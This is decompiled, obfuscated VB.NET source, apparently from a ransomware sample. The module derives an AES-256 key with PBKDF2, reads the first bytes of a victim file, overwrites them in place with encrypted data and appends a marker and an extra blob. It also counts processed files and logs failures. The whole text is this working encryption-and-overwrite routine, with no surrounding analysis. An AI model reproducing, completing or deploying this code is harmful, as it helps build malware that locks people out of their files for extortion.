Imports System
Imports System.IO
Imports System.IO.MemoryMappedFiles
Imports System.Security.Cryptography
Imports System.Text
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace jtAYXTgtXeY
	' Token: 0x02000018 RID: 24
	Public Module hYjsHlYUDnTPL
		' Token: 0x06000088 RID: 136 RVA: 0x0000D660 File Offset: 0x0000B860
		Public Function TxrnXctERKmWIPl(byte_0 As Byte(), byte_1 As Byte(), byte_2 As Byte()) As Byte()
			Dim array As Byte() = Nothing
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = hYjsHlYUDnTPL.mBFIowIoJqNFA(byte_1, byte_2)
			byte_1 = Nothing
			GC.Collect()
			Using aes As Aes = New AesManaged()
				aes.KeySize = 256
				aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8)
				aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8)
				aes.Padding = PaddingMode.None
				aes.Mode = CipherMode.CBC
				Using memoryStream As MemoryStream = New MemoryStream()
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(byte_0, 0, byte_0.Length)
						cryptoStream.Close()
					End Using
					array = memoryStream.ToArray()
				End Using
				rfc2898DeriveBytes.Dispose()
			End Using
			Return array
		End Function

		' Token: 0x06000089 RID: 137 RVA: 0x00002AA8 File Offset: 0x00000CA8
		Public Function mBFIowIoJqNFA(byte_0 As Byte(), byte_1 As Byte()) As Rfc2898DeriveBytes
			Return New Rfc2898DeriveBytes(byte_0, byte_1, 52768)
		End Function

		' Token: 0x0600008A RID: 138 RVA: 0x0000D74C File Offset: 0x0000B94C
		Public Function guFlSxvuCnmLpbsGa(string_0 As String, int_0 As Integer) As Byte()
			Dim array As Byte() = New Byte(int_0 - 1) {}
			Dim array2 As Byte()
			Try
				If JWIADYxDQdhHy.kVikcklGsTH = hYjsHlYUDnTPL.getString_0(107397015) Then
					Dim memoryMappedFile As MemoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open)
					Dim memoryMappedViewStream As MemoryMappedViewStream = memoryMappedFile.CreateViewStream()
					memoryMappedFile.Dispose()
					memoryMappedViewStream.Read(array, 0, int_0)
					memoryMappedViewStream.Flush()
					memoryMappedViewStream.Close()
					memoryMappedViewStream.Dispose()
					array2 = array
				Else
					Dim fileStream As FileStream = New FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
					fileStream.Read(array, 0, int_0)
					fileStream.Close()
					fileStream.Dispose()
					array2 = array
				End If
			Catch ex As Exception
				If JWIADYxDQdhHy.WkkVnLAdbtG Then
					Try
						File.AppendAllText(JWIADYxDQdhHy.PhOHjwgFpwoPkI, String.Concat(New String() { hYjsHlYUDnTPL.getString_0(107386080), string_0, hYjsHlYUDnTPL.getString_0(107400397), ex.Message, hYjsHlYUDnTPL.getString_0(107396384) }))
					Catch ex2 As Exception
					End Try
				End If
				Dim fileStream2 As FileStream = New FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
				fileStream2.Read(array, 0, int_0)
				fileStream2.Close()
				fileStream2.Dispose()
				array2 = array
			End Try
			Return array2
		End Function

		' Token: 0x0600008B RID: 139 RVA: 0x0000D894 File Offset: 0x0000BA94
		Public Function lgoVIMtJfUKI(DpJOLXkfgrZcYn As String, kmWfWIeiiQheSxkq As Byte(), Optional vIvgSMMyCZJGCG As Byte() = Nothing) As Boolean
			Dim flag As Boolean
			Try
				Dim array As Byte()
				If JWIADYxDQdhHy.kVikcklGsTH = hYjsHlYUDnTPL.getString_0(107397015) Then
					If Not JWIADYxDQdhHy.csOkMUvFRZv Then
						array = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(JWIADYxDQdhHy.kMCWJkiChJOZyQGt) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400860)) + Convert.ToString(JWIADYxDQdhHy.YyzRRVpMLORcsyqnO) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400860)))
					Else
						array = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(JWIADYxDQdhHy.kMCWJkiChJOZyQGt) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400851)) + Convert.ToString(JWIADYxDQdhHy.YyzRRVpMLORcsyqnO) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400851)))
					End If
					Dim memoryMappedFile As MemoryMappedFile = MemoryMappedFile.CreateFromFile(DpJOLXkfgrZcYn, FileMode.Open)
					Dim memoryMappedViewStream As MemoryMappedViewStream = memoryMappedFile.CreateViewStream()
					memoryMappedFile.Dispose()
					memoryMappedViewStream.Write(kmWfWIeiiQheSxkq, 0, kmWfWIeiiQheSxkq.Length)
					memoryMappedViewStream.Flush()
					memoryMappedViewStream.Close()
					memoryMappedViewStream.Dispose()
					Using fileStream As FileStream = New FileStream(DpJOLXkfgrZcYn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
						If Not JWIADYxDQdhHy.csOkMUvFRZv Then
							fileStream.Write(array, 0, array.Length)
						Else
							fileStream.Write(vIvgSMMyCZJGCG, 0, vIvgSMMyCZJGCG.Length)
							fileStream.Write(array, 0, array.Length)
						End If
						GoTo IL_242
					End Using
				End If
				If Not JWIADYxDQdhHy.csOkMUvFRZv Then
					array = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(JWIADYxDQdhHy.kMCWJkiChJOZyQGt) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400860)) + Convert.ToString(JWIADYxDQdhHy.YyzRRVpMLORcsyqnO) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400860)))
				Else
					array = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(JWIADYxDQdhHy.kMCWJkiChJOZyQGt) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400851)) + Convert.ToString(JWIADYxDQdhHy.YyzRRVpMLORcsyqnO) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400851)))
				End If
				Dim fileStream2 As FileStream = New FileStream(DpJOLXkfgrZcYn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
				fileStream2.Write(kmWfWIeiiQheSxkq, 0, kmWfWIeiiQheSxkq.Length)
				fileStream2.Close()
				fileStream2.Dispose()
				Using fileStream3 As FileStream = New FileStream(DpJOLXkfgrZcYn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
					If Not JWIADYxDQdhHy.csOkMUvFRZv Then
						fileStream3.Write(array, 0, array.Length)
					Else
						fileStream3.Write(vIvgSMMyCZJGCG, 0, vIvgSMMyCZJGCG.Length)
						fileStream3.Write(array, 0, array.Length)
					End If
				End Using
				IL_242:
				JWIADYxDQdhHy.LFhiMkBTtnH += 1
				Return True
			Catch ex As Exception
				If JWIADYxDQdhHy.WkkVnLAdbtG Then
					Try
						File.AppendAllText(JWIADYxDQdhHy.PhOHjwgFpwoPkI, String.Concat(New String() { hYjsHlYUDnTPL.getString_0(107386080), DpJOLXkfgrZcYn, hYjsHlYUDnTPL.getString_0(107400810), ex.Message, hYjsHlYUDnTPL.getString_0(107396384) }))
					Catch ex2 As Exception
					End Try
				End If
				Try
					Dim array2 As Byte()
					If Not JWIADYxDQdhHy.csOkMUvFRZv Then
						array2 = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(JWIADYxDQdhHy.kMCWJkiChJOZyQGt) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400860)) + Convert.ToString(JWIADYxDQdhHy.YyzRRVpMLORcsyqnO) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400860)))
					Else
						array2 = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(JWIADYxDQdhHy.kMCWJkiChJOZyQGt) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400851)) + Convert.ToString(JWIADYxDQdhHy.YyzRRVpMLORcsyqnO) + JWIADYxDQdhHy.aPAxwuEVwvWnky(hYjsHlYUDnTPL.getString_0(107400851)))
					End If
					Dim fileStream4 As FileStream = New FileStream(DpJOLXkfgrZcYn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
					fileStream4.Write(kmWfWIeiiQheSxkq, 0, kmWfWIeiiQheSxkq.Length)
					fileStream4.Close()
					fileStream4.Dispose()
					Using fileStream5 As FileStream = New FileStream(DpJOLXkfgrZcYn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
						If Not JWIADYxDQdhHy.csOkMUvFRZv Then
							fileStream5.Write(array2, 0, array2.Length)
						Else
							fileStream5.Write(vIvgSMMyCZJGCG, 0, vIvgSMMyCZJGCG.Length)
							fileStream5.Write(array2, 0, array2.Length)
						End If
					End Using
					flag = True
				Catch ex3 As Exception
					flag = False
				End Try
			End Try
			Return flag
		End Function

		' Token: 0x0600008C RID: 140 RVA: 0x00002AB6 File Offset: 0x00000CB6
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(hYjsHlYUDnTPL))
		End Sub

		' Token: 0x0400009D RID: 157
		<NonSerialized()>
		Friend getString_0 As GetString
	End Module
End Namespace
